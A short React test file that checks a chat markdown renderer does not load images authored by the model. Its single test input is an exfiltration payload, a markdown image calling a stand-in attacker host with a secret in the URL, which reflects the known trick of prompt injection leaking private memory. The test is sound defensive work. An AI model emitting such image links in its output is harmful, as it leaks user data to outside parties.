import React from 'react';
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { ChatMarkdown } from './ChatPanel';

describe('ChatMarkdown', () => {
  it('does not load model-authored image URLs', () => {
    const { container } = render(
      <ChatMarkdown>{'![private memory](https://attacker.invalid/leak?secret=value)'}</ChatMarkdown>,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('private memory')).not.toBeNull();
  });
});
